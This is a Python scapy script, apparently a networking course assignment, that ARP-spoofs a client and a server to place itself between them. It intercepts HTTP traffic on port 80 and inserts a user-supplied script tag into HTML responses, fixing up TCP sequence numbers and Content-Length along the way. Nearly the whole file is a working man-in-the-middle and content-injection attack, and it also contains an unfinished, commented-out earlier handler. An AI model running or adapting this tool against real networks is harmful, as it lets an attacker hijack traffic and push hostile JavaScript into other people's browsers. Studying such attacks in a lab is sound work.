# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *
from scapy.layers import http

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()

# Global declaration
DIR_CLIENT_TO_SERVER=0
DIR_SERVER_TO_CLIENT=1
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80
MAX_MESSAGES = 10000

routingMap = {}
sessionMap = {}
# mapSession[(IP,port)] = []

def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arpReq = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
    resp = srp(arpReq)
    print(f'# MAC for {IP}: {resp[0][0][1].hwsrc}')
    return resp[0][0][1].hwsrc

def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)

# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    spoofReq = ARP(op=2 , pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, hwsrc=src_mac)
    send(spoofReq)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    restoreReq = ARP(op=2, pdst=dstIP, psrc=srcIP, hwdst=dstMAC, hwsrc=srcMAC)
    send(restoreReq)

def getSessionIdentifier(pkt):
    global clientIP
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    if ip_src == clientIP:
        return (ip_src, pkt[TCP].sport), DIR_CLIENT_TO_SERVER
    else:
        return (ip_dst, pkt[TCP].dport), DIR_SERVER_TO_CLIENT

def getMSS(pkt):
    options = pkt[TCP].options
    for option in options:
        if option[0] == 'MSS':
            return option[1]
    return 536

def newHandlePacket(pkt):
    global clientIP, serverIP, attackerIP, script
    shouldHandle = pkt[Ether].dst == attackerMAC
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    # Reroute the packet to the client
    pkt[Ether].src = attackerMAC
    pkt[Ether].dst = routingMap[ip_dst]

    if shouldHandle: 
        # TCP checks
        ID,dir_p = getSessionIdentifier(pkt)
        # check if session exists
        if ID not in sessionMap:
            # Add thing
            print("#Beginning of a session")
            mss = getMSS(pkt)
            clientSequence = pkt[TCP].seq
            sessionMap[ID] = {
                'SeqDelayOffset': 0,
                'MSS': mss, 
                'Num': MAX_MESSAGES,
                'SplitPacket': False,
                'Inserted' : 0
            }

        # Check for finalization sequence
        if (pkt[TCP].flags & FIN != 0) and dir_p == DIR_CLIENT_TO_SERVER:
            sessionMap[ID]['Num'] = 3
        # Decrement the fin num counter
        sessionMap[ID]['Num'] -= 1
        
        # Handle packet
        # Handle according to the direction of the packet 
        # Get the values from the packet
        seqNum = pkt[TCP].seq
        ackNum = pkt[TCP].ack
        
        if dir_p == DIR_CLIENT_TO_SERVER:
            # Something           
            if pkt.haslayer(http.HTTPRequest):
                # Handle splitPacket 
                pass
            pkt[TCP].ack = ackNum - sessionMap[ID]['Inserted']
            pkt[TCP].seq = seqNum - sessionMap[ID]['SeqDelayOffset']
        elif dir_p == DIR_SERVER_TO_CLIENT:
            # Sonething
            # pkt.show()
            if pkt.haslayer(Raw):
                textToInsert = f'<script>{script}</script>'
                body = pkt[Raw].load.decode('utf-8')
                if pkt.haslayer(http.HTTPResponse):
                    # check for end html, and size of the packet
                    response = pkt.getlayer(http.HTTPResponse)
                    if '<html>' in body:
                        # Segment contains HTTP headers
                        oldCL = pkt[http.HTTPResponse].Content_Length
                        newCL = str(int(oldCL) + len(textToInsert))
                        clDiff = len(newCL) - len(oldCL)
                        sessionMap[ID]['Inserted'] += clDiff
                        pkt[http.HTTPResponse].Content_Length = newCL
                if '</body>' in body:
                    sessionMap[ID]['Inserted'] += len(textToInsert)
                    body = body.split('</body>')
                    newbody =  body[0]+textToInsert+"</body>"+body[1]
                    if len(newbody) < sessionMap[ID]['MSS']:
                        pkt[Raw].load = newbody
                    else:
                        # Handle MSS 
                        pass
            pkt[TCP].seq = seqNum + sessionMap[ID]['SeqDelayOffset']
        
        # Recompute checksums
        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[TCP].chksum
        # pkt = pkt.__class__(bytes(pkt))
        sendp(pkt)
        sessionMap[ID]['SeqDelayOffset'] = sessionMap[ID]['Inserted']
        # pkt.show()
        #print(sessionMap)

        # Remove the session from map   
        if sessionMap[ID]['Num'] == 0:
            del sessionMap[ID]

# def newHandlePacket(pkt):
#     global clientIP, serverIP, attackerIP, script
#     shouldHandle = pkt[Ether].dst == attackerMAC
#     ip_src = pkt[IP].src
#     ip_dst = pkt[IP].dst
#     # Reroute the packet to the client
#     pkt[Ether].src = attackerMAC
#     pkt[Ether].dst = routingMap[ip_dst]
#     splitPacket = False
    
#     if shouldHandle: 
#         # TCP checks
#         ID,dir_p = getSessionIdentifier(pkt)
#         # check if session exists
#         if ID not in sessionMap:
#             # Add thing
#             print("#Beginning of a session")
#             mss = getMSS(pkt)
#             clientSequence = pkt[TCP].seq
#             sessionMap[ID] = {
#                 'SeqClient':clientSequence, 
#                 'ClientACK':None, 
#                 'SpoofedSeq':clientSequence, 
#                 'SpoofedACK':None, 
#                 'MSS': mss, 
#                 'Num': MAX_MESSAGES,
#                 'SplitPacket': False,
#                 'I'
#             }
#         if (sessionMap[ID]['ClientACK'] is None) and dir_p == DIR_SERVER_TO_CLIENT:
#             sessionMap[ID]['ClientACK'] =  pkt[TCP].seq 
#             sessionMap[ID]['SpoofedACK'] = pkt[TCP].seq 

#         # Check for finalization sequence
#         if (pkt[TCP].flags & FIN != 0) and dir_p == DIR_CLIENT_TO_SERVER:
#             sessionMap[ID]['Num'] = 3
#         # Decrement the fin num counter
#         sessionMap[ID]['Num'] -= 1
        
#         # Handle packet
#         # Handle according to the direction of the packet 
#         # Get the values from the packet
#         seqNum = pkt[TCP].seq
#         ackNum = pkt[TCP].ack
        
#         if dir_p == DIR_CLIENT_TO_SERVER:
#             # Something
            
#             if pkt.haslayer(http.HTTPRequest):
#                 # Handle splitPacket 
#         elif dir_p == DIR_SERVER_TO_CLIENT:
#             # Sonething
            
#             if pkt.haslayer(http.HTTPResponse):
#                 # check for end html, and size of the packet
#                 response = pkt.getlayer(http.HTTPResponse)
#                 body = pkt[Raw].load.decode('utf-8')
#                 if '</body>' not in body:
#                     pkt[TCP].seq =
                



#                 # If mss is large break it up
        
#         # Recompute checksums
#         del pkt[IP].len
#         del pkt[IP].chksum
#         del pkt[TCP].chksum
#         pkt = pkt.__class__(bytes(pkt))
#         sendp(pkt)

#         pkt.show()
#         print(sessionMap)
        
#         # Remove the session from map   
#         if sessionMap[ID]['Num'] == 0:
#             del sessionMap[ID]

def handlePacket(pkt):
    global clientIP, serverIP, attackerMAC, script
    # Forward packet to indended host
    shouldHandle = pkt[Ether].dst == attackerMAC
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    pkt[Ether].src = attackerMAC
    pkt[Ether].dst = routingMap[ip_dst]
    
    if shouldHandle:
        # Check if DNS packet
        if pkt.haslayer(http.HTTPResponse):
            response = pkt.getlayer(http.HTTPResponse)
            # Modify the HTTP payload
            body = pkt[Raw].load.decode('utf-8').split('</body>')
            newbody =  body[0]+"<script>"+script+"</script>"+"</body>"+body[1]
            pkt[Raw].load = newbody
            pkt[http.HTTPResponse].Content_Length = str(len(newbody))
            
            # Recompute sequence number

            
            # Recompute checksums
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[TCP].chksum
            pkt = pkt.__class__(bytes(pkt))
            pkt.show()
        sendp(pkt)

# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
    routingMap[clientIP] = clientMAC
    routingMap[serverIP] = serverMAC
    sniff(prn=newHandlePacket, filter=f"tcp port 80 and ip host {clientIP}")


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    script = args.script
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
